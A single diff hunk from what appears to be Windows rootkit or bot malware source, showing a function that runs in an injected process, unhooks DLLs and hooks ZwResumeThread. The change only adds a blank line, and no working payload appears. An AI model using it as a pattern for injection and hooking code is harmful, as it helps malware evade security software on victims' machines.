@@ -493,6 +493,7 @@ void RootkitDoStartApplication(TEventData *Data, DWORD AppHash)
 DWORD WINAPI RootkitThread(LPVOID)
 {
 	BOT::Initialize();
+
     // Поток работает в заинжекченном процессе
 	UnhookDlls();
 	HookZwResumeThread();	
